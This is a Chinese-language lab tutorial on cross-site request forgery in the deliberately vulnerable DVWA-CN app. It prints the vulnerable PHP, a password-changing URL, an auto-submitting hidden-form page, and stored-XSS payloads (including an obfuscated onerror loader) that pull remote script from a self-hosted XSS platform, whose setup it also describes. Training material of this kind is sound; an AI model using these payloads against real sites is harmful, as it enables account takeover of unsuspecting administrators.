#dvwacn之五跨站请求伪造csrf

dvwacn之csrf物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/csrf/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
<?php
				
	if (isset($_GET['Change'])) {
	
		// Turn requests into variables
		$pass_new = $_GET['password_new'];
		$pass_conf = $_GET['password_conf'];


		if (($pass_new == $pass_conf)){
			$pass_new = mysql_real_escape_string($pass_new);
			$pass_new = md5($pass_new);

			$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
			$result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
						
			$html .= "<pre> Ĝëӑ¸𡡠</pre>";		
			mysql_close();
		}
	
		else{		
			$html .= "<pre> Ĝë²»ƥƤ¡£ </pre>";			
		}

	}
?>
```

- medium.php 

```
<?php
			
	if (isset($_GET['Change'])) {
	
		// Checks the http referer header
		if ( eregi ( "127.0.0.1", $_SERVER['HTTP_REFERER'] ) ){
	
			// Turn requests into variables
			$pass_new = $_GET['password_new'];
			$pass_conf = $_GET['password_conf'];

			if ($pass_new == $pass_conf){
				$pass_new = mysql_real_escape_string($pass_new);
				$pass_new = md5($pass_new);

				$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
				$result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
						
				$html .= "<pre> Ĝëӑ¸𡡠</pre>";		
				mysql_close();
			}
	
			else{		
				$html .= "<pre> Ĝë²»ƥƤ¡£ </pre>";			
			}	

		}
		
	}
?>
```


- high.php

``` 
<?php
			
	if (isset($_GET['Change'])) {
	
		// Turn requests into variables
		$pass_curr = $_GET['password_current'];
		$pass_new = $_GET['password_new'];
		$pass_conf = $_GET['password_conf'];

		// Sanitise current password input
		$pass_curr = stripslashes( $pass_curr );
		$pass_curr = mysql_real_escape_string( $pass_curr );
		$pass_curr = md5( $pass_curr );
		
		// Check that the current password is correct
		$qry = "SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';";
		$result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );

		if (($pass_new == $pass_conf) && ( $result && mysql_num_rows( $result ) == 1 )){
			$pass_new = mysql_real_escape_string($pass_new);
			$pass_new = md5($pass_new);

			$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
			$result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
						
			$html .= "<pre> Ĝëӑ¸𡡠</pre>";		
			mysql_close();
		}
	
		else{		
			$html .= "<pre> Ĝë²»ƥƤ»󄝂뵭ϳ¡£</pre>";			
		}

	}
?>
```

low.php中修改密码不需要知道原来的密码，并且不对referer进行检查

```
			
	if (isset($_GET['Change'])) {
	
		// Turn requests into variables
		$pass_new = $_GET['password_new'];
		$pass_conf = $_GET['password_conf'];


		if (($pass_new == $pass_conf)){
			$pass_new = mysql_real_escape_string($pass_new);
			$pass_new = md5($pass_new);

			$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
```

cstf地址

http://192.168.56.80/dvwacn/vulnerabilities/csrf/



##单击我测试，密码将被更改为admin888

http://192.168.56.80/dvwacn/vulnerabilities/csrf/?password_new=admin888&password_conf=admin888&Change=%B8%FC%B8%C4


页面提示

```
密码已更改
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/csrf/?password_new=admin888&password_conf=admin888&Change=更改
```

##csrf本地自动提交

本地新建csrf.html文件

文件内容如下

```
<body onload="javascript:csrf()">
<script>
function csrf(){
document.getElementById("button").click();
}
</script>


<style>
	form{
	display: none;
	}
</style>

	
<form method="GET" action="http://192.168.56.80/dvwacn/vulnerabilities/csrf/">    
    请输入新密码:<br>
    <input type="password" name="password_new" autocomplete="on" value=admin> <br>
    请再输入一次: <br>
    <input type="password" name="password_conf" autocomplete="on" value=admin>
    <br>
    <input type="submit" name="Change" id="button" value="更改">
</form>
</body>
```

本地打开csrf.html后dvwacn的管理员密码就被修改为admin了

##结合xss.me自动执行csrf

相信细心的人已经发现上面是一个html文件，需要诱使管理员打开，而且他还有弹窗。太被动了，想用ajax来发送吧，又需要跨域。怎么办呢？这里我们可以结合xss来完成攻击。

xss的精髓就是**xss就是让对方执行你的JS代码**


聪明的人已经想到了，那就是把csrf的ajax请求放到xss里，以达到攻击的效果，具体怎么做到呢，看完这一节，你就会了。

首先你要挖到一个xss漏洞(反射型、存储型都行，当然存储型更好)

存储型xss

http://192.168.56.80/dvwacn/vulnerabilities/xss_s/

xss.me平台

http://192.168.56.80/xssme/index.php?do=project&act=view&id=2

```
当前位置： 首页 > 项目代码

项目名称: csrf

项目代码：
var xmlhttp; if(window.XMLHttpRequest){ xmlhttp=new XMLHttpRequest(); }else{ xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); } xmlhttp.open("GET","http://192.168.56.80/dvwacn/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=更改",true); xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xmlhttp.send();
如何使用：
将如下代码植入怀疑出现xss的地方（注意'的转义），即可在 项目内容 观看XSS效果。

</textarea>'"><script src=http://192.168.56.80/xssme/oosEK5?1469157525></script>
或者

</textarea>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2F192.168.56.80%2Fxssme%2FoosEK5%3F%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>
再或者以你任何想要的方式插入

http://192.168.56.80/xssme/oosEK5?1469157525
完成 

```

用户输入

```
用户名：admin
信息：<script src=http://192.168.56.80/xssme/oosEK5?1469157525></script>
```

只要用户点击`A5-跨站请求伪造(CSRF)`，密码就会被改成admin。


##附件 xss.me搭建教程

1. 下载xsser.me的源码，解压缩到相应的目录xss。

2. 使用phpMyAdmin在mysql中新建一个数据库xss，将该目录下的“xss.sql”文件导入该数据库。点击执行后，可以看到已经创建好了表。

3. 执行下面的sql语句，改为自己的域名，这里我用的是本地主机搭建的环境。所以直接使用了ip地址“120.219.13.151”。
```
UPDATE oc_module SET code=REPLACE(code,'http://xss.alisec.cn','http://192.168.56.80/xssme')
```

4. 修该网站目录下面的config.php文件，根据具体情况和注释。
```
主机:		'localhost'。
用户:		'root'
密码:		''
数据库名:	'xss'
表名前缀:	oc_
注册:		normal
起始url为:	http://192.168.56.80/xssme
```

5. 访问网站测试一下，然后注册一个新的帐号。因为上面设置了normal模式，所以这里邀请码随便填。

6. 在这里提交注册时旧的版本点击提交注册后会没反应，查看源码，会发现‘type="button"’,要改为“submit”才能提交。
注意：如果登陆成功后网站是一片空白的话，则需要编辑php.ini
打开php.ini文件, 找到output_buffering = 改为on或者任何数字。

7. 进行xss的时候还需要做一件事情，就是url重写。只需要在网站目录下创建一个“.htaccess”文件即可。（仅针对Apache） 
文件内容如下：
```
<IfModule mod_rewrite.c>
RewriteEngine on
RewriteRule ^([0-9a-zA-Z]{6})$ index.php?do=code&urlKey=$1
RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$ index.php?do=do&auth=$1&domain=$3
RewriteRule ^register/(.*?)$ index.php?do=register&key=$1
RewriteRule ^register-validate/(.*?)$ index.php?do=register&act=validate&key=$1
RewriteRule ^login$ index.php?do=login
</IfModule>
```
注意：最好将是否启用url rewrite改成true。

8. 如果需要给自己点权限，然后可以发放邀请码。修改user表里相应用户的的adminLevel项的值为“1”即可。phpmyadmin里直接双击修改即可。或者执行sql语句
```
UPDATE `xss`.`oc_user` SET `adminLevel` = '1' WHERE `oc_user`.`id` =1 LIMIT 1 ;
```

9. 然后修改config.php文件，经注册配置为只允许邀请注册。然后重新登录。

10. 然后访问“`http://120.219.13.151/xss/index.php?do=user&act=invite`”页面，发放邀请码。